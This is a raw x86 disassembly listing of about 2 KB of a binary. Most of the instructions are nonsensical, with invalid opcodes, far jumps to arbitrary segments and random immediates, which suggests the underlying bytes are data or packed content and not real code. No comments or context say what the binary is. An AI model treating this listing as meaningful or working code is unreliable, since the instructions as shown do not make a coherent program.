  41f0ae:	clc    
  41f0af:	mov    cl,dl
  41f0b1:	fstp   TBYTE PTR [edi-0x6a]
  41f0b4:	pop    ebx
  41f0b5:	add    al,BYTE PTR [edx-0x5d0e83cb]
  41f0bb:	inc    edx
  41f0bc:	sbb    DWORD PTR [esi],edi
  41f0be:	dec    esi
  41f0bf:	enter  0x6319,0x3b
  41f0c3:	push   esi
  41f0c4:	out    dx,al
  41f0c5:	dec    esp
  41f0c6:	jmp    0x41f0d1
  41f0c8:	cmc    
  41f0c9:	mov    dh,0xaf
  41f0cb:	scas   al,BYTE PTR es:[edi]
  41f0cc:	jbe    0x41f097
  41f0ce:	xchg   ebp,eax
  41f0cf:	mov    esi,0xeb1ec535
  41f0d4:	push   es
  41f0d5:	out    dx,al
  41f0d6:	sti    
  41f0d7:	call   0xf8a7:0x89af1d4a
  41f0de:	mov    ah,0x5e
  41f0e0:	mov    ebp,0xedbb5ac7
  41f0e5:	sbb    edi,DWORD PTR [ebx+ebx*8-0x7c]
  41f0e9:	xchg   ebx,eax
  41f0ea:	and    al,0x8e
  41f0ec:	jle    0x41f13f
  41f0ee:	fnstenv [ebx+ebx*2]
  41f0f1:	loope  0x41f13c
  41f0f3:	ret    0x9fb2
  41f0f6:	lods   al,BYTE PTR ds:[esi]
  41f0f7:	push   edi
  41f0f8:	jb     0x41f0d9
  41f0fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0fb:	test   BYTE PTR [ebp+edi*4-0x23],al
  41f0ff:	lock cld 
  41f101:	into   
  41f102:	xor    eax,0xc354db60
  41f107:	jne    0x41f17f
  41f109:	jbe    0x41f09e
  41f10b:	pop    ecx
  41f10c:	sub    al,0x97
  41f10e:	(bad)  
  41f10f:	push   ss
  41f110:	repnz add BYTE PTR [eax],al
	...
  41f173:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  41f179:	mov    ebx,0x3824ffdf
  41f17e:	(bad)  
  41f17f:	jmp    0x4b2f:0xa4f18275
  41f186:	add    DWORD PTR [eax],eax
  41f188:	add    eax,0x2f000001
  41f18d:	clc    
  41f18e:	fnstcw WORD PTR [edx]
  41f190:	jne    0x41f158
  41f192:	ja     0x41f1c9
  41f194:	or     ebp,ecx
  41f196:	and    eax,0xa22139ec
  41f19b:	dec    eax
  41f19c:	pop    DWORD PTR [edx]
  41f19e:	xchg   edi,eax
  41f19f:	test   BYTE PTR [eax],dh
  41f1a1:	jno    0x41f206
  41f1a3:	and    al,0x3c
  41f1a5:	pushf  
  41f1a6:	mov    WORD PTR [ebx+0x6e32b493],?
  41f1ac:	jle    0x41f137
  41f1ae:	sti    
  41f1af:	sub    al,0xfc
  41f1b1:	push   0x69
  41f1b3:	dec    ebp
  41f1b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1b5:	adc    BYTE PTR [ebp+0x1d679c46],0x95
  41f1bc:	lods   eax,DWORD PTR ds:[esi]
  41f1bd:	nop
  41f1be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1bf:	push   ebp
  41f1c0:	mov    cl,0xf2
  41f1c2:	dec    ecx
  41f1c3:	and    DWORD PTR [eax-0x7965805d],edx
  41f1c9:	cs xchg esp,eax
  41f1cb:	mov    ebp,0xa3281d09
  41f1d0:	ins    BYTE PTR es:[edi],dx
  41f1d1:	dec    esi
  41f1d2:	mov    edx,0xad65a301
  41f1d7:	adc    eax,0xa992e702
  41f1dc:	mov    al,0xe
  41f1de:	dec    ebx
  41f1df:	mov    ecx,0xc22b979c
  41f1e4:	dec    ebp
  41f1e5:	call   0x1975:0xd5f1d041
  41f1ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1ed:	(bad)  
  41f1ee:	rol    DWORD PTR [edx+edx*8-0x54],1
  41f1f2:	loope  0x41f18b
  41f1f4:	dec    edi
  41f1f5:	fist   WORD PTR [ebx+0x63]
  41f1f8:	mov    dh,0x52
  41f1fa:	xor    eax,0xf1d53ec6
  41f1ff:	mov    esp,0xc66b213b
  41f204:	jbe    0x41f227
  41f206:	aaa    
  41f207:	fsubr  QWORD PTR [edi-0x726e27f5]
  41f20d:	test   BYTE PTR [ebx+edi*8-0x24],ch
  41f211:	pop    esp
  41f212:	and    eax,0xdd672abd
  41f217:	popa   
  41f218:	int    0xfd
  41f21a:	cs pop ecx
  41f21c:	bswap  ecx
  41f21e:	add    bl,BYTE PTR [ebx-0x65e04114]
  41f224:	mov    esi,0x68b1037e
  41f229:	or     DWORD PTR [ecx+ebp*2],esp
  41f22c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f22d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f22e:	popa   
  41f22f:	das    
  41f230:	pop    ebx
  41f231:	inc    edi
  41f232:	(bad)  
  41f233:	fdiv   QWORD PTR [ebx]
  41f235:	cli    
  41f236:	jle    0x41f1c5
  41f238:	retf   0x8e04
  41f23b:	mov    ?,edx
  41f23d:	(bad)  
  41f23e:	repnz daa 
  41f240:	ja     0x41f1f2
  41f242:	test   esi,ebx
  41f244:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f245:	aam    0x64
  41f247:	jmp    0x59fe5c36
  41f24c:	push   ebx
  41f24d:	xor    DWORD PTR [ebx+0x43],edi
  41f250:	shl    ecx,cl
  41f252:	add    al,BYTE PTR [eax-0x3b620d1f]
  41f258:	mov    ss,ebp
  41f25a:	xchg   DWORD PTR [ecx],esp
  41f25c:	jae    0x41f277
  41f25e:	js     0x41f222
  41f260:	push   cs
  41f261:	xor    ah,BYTE PTR [ebx]
  41f263:	mov    bl,0x2e
  41f265:	xor    BYTE PTR [eax-0x6ea62d28],al
  41f26b:	pop    ebp
  41f26c:	mov    bh,0x3c
  41f26e:	lahf   
  41f26f:	add    BYTE PTR [ebx*2-0x2326d082],ch
  41f276:	psubusw mm7,mm0
  41f279:	popf   
  41f27a:	sub    DWORD PTR [ecx-0x6aeb50c2],0xffffffb7
  41f281:	fistp  WORD PTR [ebx+ebx*2+0x1318fbb]
  41f288:	pop    es
  41f289:	test   eax,eax
  41f28b:	aaa    
  41f28c:	xchg   esp,eax
  41f28d:	add    eax,0x8cb736
	...
  41f2f2:	add    BYTE PTR [eax],al
  41f2f4:	push   ecx
  41f2f5:	sbb    edi,edi
  41f2f7:	jmp    si
  41f2fa:	fnstcw WORD PTR [edi]
  41f2fc:	jo     0x41f2eb
  41f2fe:	sahf   
  41f2ff:	jb     0x41f31a
  41f301:	and    al,0x9f
  41f303:	in     eax,dx
  41f304:	xor    al,0x4c
  41f306:	add    DWORD PTR [eax],eax
  41f308:	add    eax,0x6a000001
  41f30d:	arpl   WORD PTR [esi+0x3e],ax
  41f310:	stc    
  41f311:	aad    0x87
  41f313:	xchg   BYTE PTR [edi+ebx*2],bl
  41f316:	xchg   ebx,eax
  41f317:	(bad)  
  41f318:	pop    DWORD PTR [edx]
  41f31a:	std    
  41f31b:	pusha  
  41f31c:	mov    ds:0x6db18d85,al
  41f321:	and    DWORD PTR [edx+0x1a],edi
  41f324:	popf   
  41f325:	pushf  
  41f326:	popa   
  41f327:	fldenv [ebp+edi*2+0x6e1bcae3]
  41f32e:	inc    esi
  41f32f:	cvtpi2ps xmm7,QWORD PTR [esp+eax*1]
  41f333:	into   
  41f334:	xor    BYTE PTR [ebx],0xbf
  41f337:	xchg   esp,eax
  41f338:	xor    DWORD PTR [ebx+0x7899ff5f],esi
  41f33e:	repz cwde 
  41f340:	or     edi,eax
  41f342:	xchg   edi,eax
  41f343:	xor    al,0x2b
  41f345:	ss out 0xda,al
  41f348:	or     al,0xcf
  41f34a:	cmp    al,0x94
  41f34c:	add    BYTE PTR [ebp+ebp*1-0x6],bl
  41f350:	mov    bh,dh
  41f352:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f353:	scas   eax,DWORD PTR es:[edi]
  41f354:	gs in  al,0x2e
  41f357:	jo     0x41f380
  41f359:	neg    DWORD PTR [edi]
  41f35b:	or     DWORD PTR [edi-0x3ae828b],ebp
  41f361:	fwait
  41f362:	das    
  41f363:	dec    esp
  41f364:	rol    ebx,0xf3
  41f367:	jns    0x41f3af
  41f369:	xchg   edx,eax
  41f36a:	popa   
  41f36b:	dec    ebx
  41f36c:	dec    ecx
  41f36d:	jns    0x41f2f6
  41f36f:	sbb    ah,bh
  41f371:	sub    ah,BYTE PTR [esi+0x605c44e1]
  41f377:	js     0x41f39d
  41f379:	out    dx,al
  41f37a:	not    DWORD PTR [ecx+0x67d311c1]
  41f380:	test   bl,bh
  41f382:	sbb    BYTE PTR [ecx+0x170d9440],dl
  41f388:	retf   
  41f389:	(bad)  
  41f38a:	rcl    DWORD PTR [edi-0x30],1
  41f38d:	add    esi,0xe7d67a7f
  41f393:	stos   BYTE PTR es:[edi],al
  41f394:	push   ebx
  41f395:	and    DWORD PTR [ebx+0x14],0xffffff8f
  41f399:	inc    ebp
  41f39a:	xchg   edx,eax
  41f39b:	fld    TBYTE PTR [ebp+ebp*1+0xb]
  41f39f:	push   ecx
  41f3a0:	add    DWORD PTR [esi+0x20935d99],ebx
  41f3a6:	or     al,0xc4
  41f3a8:	and    eax,0x5d1c798a
  41f3ad:	loop   0x41f409
  41f3af:	loop   0x41f341
  41f3b1:	jne    0x41f3c7
  41f3b3:	adc    al,0xc2
  41f3b5:	push   ds
  41f3b6:	lods   al,BYTE PTR ds:[esi]
  41f3b7:	jmp    0x9120230a
  41f3bc:	or     ch,ch
  41f3be:	mov    edx,0x4c60d240
  41f3c3:	mov    ds:0xb3fc2294,eax
  41f3c8:	inc    ebp
  41f3c9:	in     eax,0x6f
  41f3cb:	fisttp QWORD PTR [esi]
  41f3cd:	jmp    0x6c52:0xbe7eb23
  41f3d4:	nop
  41f3d5:	js     0x41f384
  41f3d7:	sbb    dl,BYTE PTR [ebx]
  41f3d9:	sub    eax,DWORD PTR [edi]
  41f3db:	mov    bl,0x64
  41f3dd:	sub    al,0xf4
  41f3df:	jmp    0x29fe3674
  41f3e4:	pop    edx
  41f3e5:	push   cs
  41f3e6:	push   es
  41f3e7:	inc    ecx
  41f3e8:	and    BYTE PTR [ebp-0x3b],cl
  41f3eb:	scas   eax,DWORD PTR es:[edi]
  41f3ec:	mov    eax,ds:0x7fcd6dc7
  41f3f1:	mov    ds,WORD PTR [ecx-0x7f5471cc]
  41f3f7:	(bad)  
  41f3f8:	jmp    0xe407:0x3e34e209
  41f3ff:	in     eax,0xe5
  41f401:	mov    ch,0xa
  41f403:	(bad)  
  41f404:	and    ch,BYTE PTR [ebx+0x5076b50]
  41f40a:	mov    cl,0x3
  41f40c:	push   cs
  41f40d:	dec    eax
  41f40e:	jmp    FWORD PTR cs:[eax+eax*1+0x0]
	...
  41f472:	add    BYTE PTR [eax],al
  41f474:	cmp    al,0xe7
  41f476:	imul   ebp,edi,0xfffffffb
  41f479:	out    dx,eax
  41f47a:	mov    esp,0xd5fd13f7
  41f47f:	mov    ch,0x21
  41f481:	and    eax,0x4d39f938
  41f486:	add    DWORD PTR [eax],eax
  41f488:	add    eax,0x8f000001
  41f48d:	xchg   esp,eax
  41f48e:	dec    eax
  41f48f:	cmp    eax,0xb62fb06c
  41f494:	adc    esp,DWORD PTR ds:0x19936707
  41f49a:	fld    st(2)
  41f49c:	sbb    bh,BYTE PTR [ecx+0x59]
  41f49f:	ret    
  41f4a0:	mov    ecx,0xe2b83d8b
  41f4a5:	nop
  41f4a6:	mov    dh,0xa6
  41f4a8:	sub    esp,DWORD PTR [edx+0x5c828706]
  41f4ae:	lock and eax,0xb051bc6a
  41f4b4:	mov    bl,0x3e
  41f4b6:	xchg   ebx,eax
  41f4b7:	cmp    cl,BYTE PTR [ecx+0x53ae3c2]
  41f4bd:	call   0xea67ac23
  41f4c2:	sbb    eax,0xceb5d5
  41f4c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4c8:	push   edi
  41f4c9:	jmp    0x5acd:0xa55d5521
  41f4d0:	push   cs
  41f4d1:	in     eax,dx
  41f4d2:	ds int3 
  41f4d4:	stos   BYTE PTR es:[edi],al
  41f4d5:	lock lea ebp,[eax+0x7c43325f]
  41f4dc:	push   ebx
  41f4dd:	pushf  
  41f4de:	cmc    
  41f4df:	add    ch,BYTE PTR [ebx+ebp*2-0x4a64404b]
  41f4e6:	repz push cs
  41f4e8:	mov    ch,0x0
  41f4ea:	mov    cl,0x69
  41f4ec:	arpl   WORD PTR [ecx],si
  41f4ee:	stc    
  41f4ef:	(bad)  
  41f4f0:	nop
  41f4f1:	arpl   WORD PTR [ebx],si
  41f4f3:	push   0xffffff9c
  41f4f5:	mov    esp,0x730557b5
  41f4fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4fb:	aas    
  41f4fc:	or     ebp,esi
  41f4fe:	xchg   BYTE PTR ds:0xe8de6cdf,bl
  41f504:	or     bl,BYTE PTR [eax]
  41f506:	call   0x24f5:0x1ca4565
  41f50d:	mov    edx,ecx
  41f50f:	jmp    0xc4ab:0x98d41cb6
  41f516:	push   0x41
  41f518:	popa   
  41f519:	scas   al,BYTE PTR es:[edi]
  41f51a:	cmp    dl,dh
  41f51c:	add    BYTE PTR ds:0x47da6bf1,0xb9
  41f523:	adc    al,0x4c
  41f525:	jbe    0x41f545
  41f527:	push   0x9977972e
  41f52c:	int    0x49
  41f52e:	mov    esp,0xe27ab47e
  41f533:	out    dx,eax
  41f534:	psrld  mm5,mm0
  41f537:	sahf   
  41f538:	adc    eax,0x1d538781
  41f53d:	clc    
  41f53e:	gs das 
  41f540:	xchg   esi,eax
  41f541:	or     eax,0xedb9acdc
  41f546:	jle    0x41f4e2
  41f548:	(bad)  
  41f549:	rcl    dl,0xa0
  41f54c:	adc    al,0x39
  41f54e:	mov    fs,WORD PTR [ebx]
  41f550:	mov    al,ds:0x24b6ec77
  41f555:	repz xor BYTE PTR [esi-0x3e1c6598],0xfa
  41f55d:	mov    edi,0x5a8b4863
  41f562:	inc    ebx
  41f563:	push   cs
  41f564:	ds ffreep st(7)
  41f567:	mov    ebp,0x15c608db
  41f56c:	jns    0x41f5c1
  41f56e:	ja     0x41f561
  41f570:	ins    BYTE PTR es:[edi],dx
  41f571:	stos   DWORD PTR es:[edi],eax
  41f572:	add    DWORD PTR [ecx+0x7a339984],eax
  41f578:	adc    al,0xcd
  41f57a:	inc    esp
  41f57b:	push   ebp
  41f57c:	into   
  41f57d:	je     0x41f5d4
  41f57f:	mov    ecx,0x212be4e4
  41f584:	cdq    
  41f585:	sbb    DWORD PTR [edx+0x21553cea],0xffffff82
  41f58c:	sbb    BYTE PTR [edx+0x644d6e],bl
	...
  41f5f2:	add    BYTE PTR [eax],al
  41f5f4:	js     0x41f62a
  41f5f6:	add    bh,bl
  41f5f8:	dec    esi
  41f5f9:	(bad)  
  41f5fa:	stc    
  41f5fb:	mov    bh,0xb7
  41f5fd:	jmp    0x87e0:0xaca9d422
  41f604:	ds dec esi
  41f606:	add    DWORD PTR [eax],eax
  41f608:	add    eax,0x96000001
  41f60d:	xchg   edx,eax
  41f60e:	xchg   esp,eax
  41f60f:	test   cl,cl
  41f611:	scas   eax,DWORD PTR es:[edi]
  41f612:	dec    ebp
  41f613:	call   0x7b56:0x78414c54
  41f61a:	arpl   WORD PTR [ecx-0x16cede47],ax
  41f620:	in     eax,0xd4
  41f622:	push   cs
  41f623:	sahf   
  41f624:	dec    esi
  41f625:	std    
  41f626:	call   0x5679:0xbd713ca5
  41f62d:	mov    ecx,0xfa24bcd7
  41f632:	scas   eax,DWORD PTR es:[edi]
  41f633:	sub    eax,0xecae8ca5
  41f638:	mov    ebx,0x41d670ce
  41f63d:	inc    esp
  41f63e:	cli    
  41f63f:	xchg   edi,eax
  41f640:	add    BYTE PTR [ebp-0x2a79e2c],dh
  41f646:	or     al,0x30
  41f648:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f649:	idiv   BYTE PTR [ebx+eax*1+0x74877f1e]
  41f650:	or     BYTE PTR [eax-0x2325fc5f],0xca
  41f657:	out    0x22,eax
  41f659:	push   esp
  41f65a:	or     dl,dh
  41f65c:	dec    esi
  41f65d:	pop    ebp
  41f65e:	mov    cl,0x70
  41f660:	enter  0xa835,0xcd
  41f664:	jp     0x41f6a4
  41f666:	bound  ebp,QWORD PTR [ebx-0x10]
  41f669:	dec    edx
  41f66a:	xchg   ebp,eax
  41f66b:	loope  0x41f6c4
  41f66d:	jbe    0x41f6d7
  41f66f:	push   ebp
  41f670:	int    0x3f
  41f672:	arpl   WORD PTR [esi],di
  41f674:	shr    DWORD PTR [esi+0x25686faf],0x19
  41f67b:	jle    0x41f6f1
  41f67d:	ins    DWORD PTR es:[edi],dx
  41f67e:	les    edx,FWORD PTR [edi+0x33]
  41f681:	add    edi,ecx
  41f683:	cmp    BYTE PTR [ecx],cl
  41f685:	call   0xc56f:0x87e1225
  41f68c:	dec    eax
  41f68d:	out    0xa8,eax
  41f68f:	(bad)  
  41f690:	xor    al,0x79
  41f692:	retf   0x8503
  41f695:	dec    ah
  41f697:	call   0x466f:0xce54d22c
  41f69e:	pusha  
  41f69f:	pop    esi
  41f6a0:	xchg   ebx,eax
  41f6a1:	loop   0x41f6e5
  41f6a3:	sub    DWORD PTR [esi],esi
  41f6a5:	fsub   DWORD PTR [ebp-0xd52c0bd]
  41f6ab:	sbb    eax,0x359036a4
  41f6b0:	ret    0xd0e2
  41f6b3:	les    ecx,FWORD PTR [ebx-0x4f]
  41f6b6:	xchg   DWORD PTR [esi+0x7246e02d],esp
  41f6bc:	stos   DWORD PTR es:[edi],eax
  41f6bd:	shl    BYTE PTR [esi-0x7f780527],1
  41f6c3:	push   edi
  41f6c4:	xchg   edx,eax
  41f6c5:	(bad)  
  41f6c6:	test   eax,0xa534c7b1
  41f6cb:	jmp    0xf44e94d
  41f6d0:	ret    0xa24f
  41f6d3:	in     eax,0x8
  41f6d5:	add    eax,0xca48ff8b
  41f6da:	jae    0x41f711
  41f6dc:	sub    edx,DWORD PTR [edx]
  41f6de:	sahf   
  41f6df:	leave  
  41f6e0:	test   al,0xf3
  41f6e2:	xlat   BYTE PTR ds:[ebx]
  41f6e3:	mov    bl,0xf1
  41f6e5:	outs   dx,BYTE PTR ds:[esi]
  41f6e6:	mov    bh,0x9c
  41f6e8:	retf   
  41f6e9:	mov    edi,0x4e0f0e3e
  41f6ee:	cmp    ebx,ecx
  41f6f0:	jl     0x41f677
  41f6f2:	mov    eax,ds:0x7c12340
  41f6f7:	dec    ebp
  41f6f8:	fimul  DWORD PTR [edi+0x18]
  41f6fb:	dec    eax
  41f6fc:	stos   BYTE PTR es:[edi],al
  41f6fd:	mov    ebx,0xf13e2091
  41f702:	cwde   
  41f703:	cmp    al,0x95
  41f705:	ret    0x9581
  41f708:	test   DWORD PTR [edi+0xd],0xa5045e99
  41f70f:	dec    ebp
  41f710:	leave  
	...
  41f771:	add    BYTE PTR [eax],al
  41f773:	add    BYTE PTR [edx-0x5081dcc4],dl
  41f779:	jg     0x41f75a
  41f77b:	cld    
  41f77c:	call   0x1d4c:0x866c62d2
  41f783:	xor    al,BYTE PTR [ebx+0x4f]
  41f786:	add    DWORD PTR [eax],eax
  41f788:	add    eax,0xaf000001
  41f78d:	int    0xb2
  41f78f:	data16 das 
  41f791:	test   bl,ch
  41f793:	cdq    
  41f794:	repnz dec ebp
  41f796:	outs   dx,DWORD PTR ds:[esi]
  41f797:	cmp    edi,DWORD PTR [ebx-0x1332fa3c]
  41f79d:	ins    BYTE PTR es:[edi],dx
  41f79e:	pop    eax
  41f79f:	mov    esp,0x79a368c1
  41f7a4:	and    al,0x19
  41f7a6:	fs add eax,0x3948ca0b
  41f7ac:	loop   0x41f7c9
  41f7ae:	add    DWORD PTR [esi-0x5b],ecx
  41f7b1:	out    0xfa,eax
  41f7b3:	mov    al,0xc2
  41f7b5:	cmp    esp,edx
  41f7b7:	jecxz  0x41f7fa
  41f7b9:	mov    eax,0xd538a85c
  41f7be:	aas    
  41f7bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7c0:	rol    DWORD PTR [eax+0x26824b7b],cl
  41f7c6:	shl    DWORD PTR [edi],0x45
  41f7c9:	cmp    BYTE PTR ds:0x6a113389,ch
  41f7cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7d0:	inc    ebp
  41f7d1:	ja     0x41f7a3
  41f7d3:	(bad)  [edi+edx*4]
  41f7d6:	mov    WORD PTR [ebp+0x18],gs
  41f7d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7da:	cdq    
  41f7db:	pop    edi
  41f7dc:	shl    cl,1
  41f7de:	out    0x16,al
  41f7e0:	scas   eax,DWORD PTR es:[edi]
  41f7e1:	xchg   ecx,eax
  41f7e2:	mov    ds,eax
  41f7e4:	push   ds
  41f7e5:	sbb    esp,DWORD PTR [edx]
  41f7e7:	dec    eax
  41f7e8:	dec    ebx
  41f7e9:	cs jno 0x41f790
  41f7ec:	jne    0x41f86b
  41f7ee:	int    0xe8
  41f7f0:	xor    eax,0xe6dffbfa
  41f7f5:	outs   dx,BYTE PTR ds:[esi]
  41f7f6:	xor    eax,0x4c12ed89
  41f7fb:	data16 loop 0x41f7b5
  41f7fe:	leave  
  41f7ff:	cmc    
  41f800:	fisub  DWORD PTR [esi-0x14f5fd48]
  41f806:	sbb    eax,0x787bdae3
  41f80b:	aaa    
  41f80c:	xchg   ecx,eax
  41f80d:	outs   dx,BYTE PTR ds:[esi]
  41f80e:	cli    
  41f80f:	mov    ?,WORD PTR [esi+0x4a]
  41f812:	dec    ebp
  41f813:	bound  ebx,QWORD PTR [edx]
  41f815:	in     eax,0xd9
  41f817:	sbb    al,0x99
  41f819:	les    edi,FWORD PTR [eax]
  41f81b:	popf   
  41f81c:	inc    DWORD PTR [ebp-0x2e812d9c]
  41f822:	adc    ebp,DWORD PTR [eax+0x29c7a4]
  41f828:	pop    esi
  41f829:	call   0xbd71:0x80957b14
  41f830:	test   BYTE PTR [ebx+0x5e55cec2],al
  41f836:	aaa    
  41f837:	sub    ah,BYTE PTR [edx+eiz*8-0x5e]
  41f83b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f83c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f83d:	pushf  
  41f83e:	ja     0x41f857
  41f840:	sbb    BYTE PTR [ecx+ebx*4-0x14],bh
  41f844:	xchg   edx,eax
  41f845:	imul   edx,DWORD PTR [edx+0x4a],0xf1da278c
  41f84c:	sbb    ebx,ecx
  41f84e:	mov    dh,0x6c
  41f850:	sti    
  41f851:	ret    
  41f852:	(bad)  
  41f854:	cmp    al,0xa2
  41f856:	sbb    edi,DWORD PTR [esi-0x34]
  41f859:	mov    eax,DWORD PTR [ebx]
  41f85b:	ss call 0x970f:0x63043839
  41f863:	loop   0x41f895
  41f865:	call   0x9b80b71c
  41f86a:	sbb    BYTE PTR [eax-0x664a5024],bl
  41f870:	pop    ebx
  41f871:	push   edi
  41f872:	add    eax,0x6ae8bea1
  41f877:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f878:	cmp    eax,0x31709582
  41f87d:	stos   DWORD PTR es:[edi],eax
  41f87e:	repnz mov dh,0x2d
  41f881:	sub    DWORD PTR [edi+0x27b1a023],ebp
  41f887:	push   edi
  41f888:	stc    
  41f889:	jbe    0x41f815
  41f88b:	xor    edx,ecx
  41f88d:	adc    DWORD PTR [esp+edx*4],edi
  41f890:	jl     0x41f892
	...
  41f8f2:	add    BYTE PTR [eax],al
  41f8f4:	mov    eax,ds:0x3b920b9a
  41f8f9:	xchg   ebx,eax
  41f8fa:	mov    ecx,0x4183febb
  41f8ff:	pop    edx
  41f900:	cdq    
  41f901:	dec    eax
  41f902:	add    al,0xef
  41f904:	dec    eax
  41f905:	push   eax
  41f906:	add    DWORD PTR [eax],eax
  41f908:	add    eax,0xb4000001
  41f90d:	ja     0x41f8ce
  41f90f:	push   edi
  41f910:	xor    BYTE PTR [ecx],ah
  41f912:	xor    al,0x75
  41f914:	pop    edi
  41f915:	mov    al,0x70
  41f917:	cmp    DWORD PTR [esi],edi
  41f919:	call   0x7d92348d
  41f91e:	(bad)  
  41f91f:	mov    eax,0x4f784e0e
  41f924:	cmp    al,0x90
  41f926:	bound  eax,QWORD PTR [edi+0x2fc0acd4]
  41f92c:	(bad)  
  41f92d:	mov    dl,0x61
  41f92f:	mov    es,WORD PTR [ecx+eiz*8]
  41f932:	xlat   BYTE PTR ds:[ebx]
  41f933:	fndisi(8087 only) 
  41f935:	xchg   ebp,eax
  41f936:	aad    0x17
  41f938:	(bad)  
  41f939:	icebp  
  41f93a:	je     0x41f96f
  41f93c:	mov    ah,0x1f
  41f93e:	inc    esi
  41f93f:	or     eax,0xee3dc3d6
  41f944:	mov    ebp,0x49a4e5db
  41f949:	mov    dl,0xed
  41f94b:	mov    bh,0x12
  41f94d:	cmp    esp,DWORD PTR fs:[ebx]
  41f950:	pop    eax
  41f951:	xor    al,0x44
  41f953:	mov    al,0x53
  41f955:	and    al,0xa5
  41f957:	inc    BYTE PTR [edx-0x72c5fe09]
  41f95d:	data16 ds stc 
  41f960:	sub    DWORD PTR [edx+edx*2],0x39
  41f964:	shr    BYTE PTR [ebx-0x4f],cl
  41f967:	or     al,0x9d
  41f969:	std    
  41f96a:	cmp    al,0x33
  41f96c:	sbb    al,0x80
  41f96e:	out    dx,al
  41f96f:	cld    
  41f970:	pop    ebp
  41f971:	jmp    0xbbe993c3
  41f976:	pop    es
  41f977:	loop   0x41f979
  41f979:	int    0xdb
  41f97b:	cwde   
  41f97c:	aam    0x53
  41f97e:	fwait
  41f97f:	jns    0x41f989
  41f981:	scas   eax,DWORD PTR es:[di]
  41f983:	sub    BYTE PTR [ecx+0x4e],ch
  41f986:	xchg   esp,eax
  41f987:	add    BYTE PTR [ecx+edx*8],ah
  41f98a:	stos   DWORD PTR es:[edi],eax
  41f98b:	fwait
  41f98c:	aam    0xf7
  41f98e:	sbb    esp,edi
  41f990:	sbb    dh,BYTE PTR [ebp-0x7dfef991]
  41f996:	jo     0x41fa10
  41f998:	xchg   esp,eax
  41f999:	xor    ebp,ecx
  41f99b:	adc    BYTE PTR [ebx+0x76acdf6a],bl
  41f9a1:	fnstenv [ecx+0x18]
  41f9a4:	push   edx
  41f9a5:	sbb    DWORD PTR [esi],eax
  41f9a7:	cdq    
  41f9a8:	ficom  DWORD PTR [ebp+0x12]
  41f9ab:	add    al,0xcd
  41f9ad:	add    eax,edi
  41f9af:	mov    al,0x5
  41f9b1:	dec    ecx
  41f9b2:	int3   
  41f9b3:	mov    al,ds:0xd0efd876
  41f9b8:	les    esp,FWORD PTR [ebp-0x1a40450e]
  41f9be:	and    ecx,DWORD PTR [ebx]
  41f9c0:	stc    
  41f9c1:	pop    es
  41f9c2:	loop   0x41f99a
  41f9c4:	pop    ebx
  41f9c5:	push   esp
  41f9c6:	das    
  41f9c7:	push   0xadf24333
  41f9cc:	aaa    
  41f9cd:	add    ecx,esp
  41f9cf:	aas    
  41f9d0:	push   esp
  41f9d1:	ss jns 0x41f9d2
  41f9d4:	call   FWORD PTR [eax]
  41f9d6:	push   esp
  41f9d7:	stos   BYTE PTR es:[edi],al
  41f9d8:	bound  ebx,QWORD PTR [edx+0x4a]
  41f9db:	sahf   
  41f9dc:	frstor [ecx+0x66177e5e]
  41f9e2:	xchg   BYTE PTR [ebx-0xfefc48d],ah
  41f9e8:	sahf   
  41f9e9:	outs   dx,DWORD PTR ds:[esi]
  41f9ea:	out    0xab,eax
  41f9ec:	inc    ecx
  41f9ed:	or     DWORD PTR [ebx+0x5d92b8d8],ecx
  41f9f3:	push   eax
  41f9f4:	call   0x7971:0x38670ff8
  41f9fb:	dec    edx
  41f9fc:	clc    
  41f9fd:	out    0x19,eax
  41f9ff:	std    
  41fa00:	jae    0x41fa56
  41fa02:	pop    esp
  41fa03:	xor    ebp,DWORD PTR [esi-0x2ddab145]
  41fa09:	pusha  
  41fa0a:	and    bl,BYTE PTR [eax-0x759cb4ae]
  41fa10:	test   BYTE PTR [eax],0x0
	...
  41fa73:	add    BYTE PTR [edx],cl
  41fa75:	inc    ecx
  41fa76:	mov    bh,0xa1
  41fa78:	push   edi
  41fa7a:	push   ds
  41fa7b:	jmp    0x41faa0
  41fa7d:	push   edi
  41fa7e:	mov    ds:0x57150515,eax
  41fa83:	pop    edx
  41fa84:	dec    ebp
  41fa85:	push   ecx
  41fa86:	add    DWORD PTR [eax],eax
  41fa88:	add    eax,0xc4000001
  41fa8d:	ror    DWORD PTR [ecx-0x55],cl
  41fa90:	hlt    
  41fa91:	add    al,0x9d
  41fa93:	inc    edx
  41fa94:	pop    esi
  41fa95:	or     ecx,edi
  41fa97:	retf   
  41fa98:	sbb    DWORD PTR gs:[ebx+0x16],0x47
  41fa9d:	ss xchg ebx,eax
  41fa9f:	ins    BYTE PTR es:[edi],dx
  41faa0:	jbe    0x41fa9a
  41faa2:	mov    cl,0x79
  41faa4:	mov    dl,0xe1
  41faa6:	pop    edi
  41faa7:	pop    ebp
  41faa8:	mov    ah,0x1b
  41faaa:	jecxz  0x41fae3
  41faac:	adc    ebx,edi
  41faae:	data16 inc BYTE PTR [ebx+0x6]
  41fab2:	push   ecx
  41fab3:	fcomip st,st(5)
  41fab5:	jge    0x41facd
  41fab7:	jno    0x41fae5
  41fab9:	and    BYTE PTR es:[edi],ch
  41fabc:	or     ch,BYTE PTR [edx]
  41fabe:	ds loop 0x41fb3e
  41fac1:	jne    0x41faf1
  41fac3:	inc    esi
  41fac4:	out    dx,eax
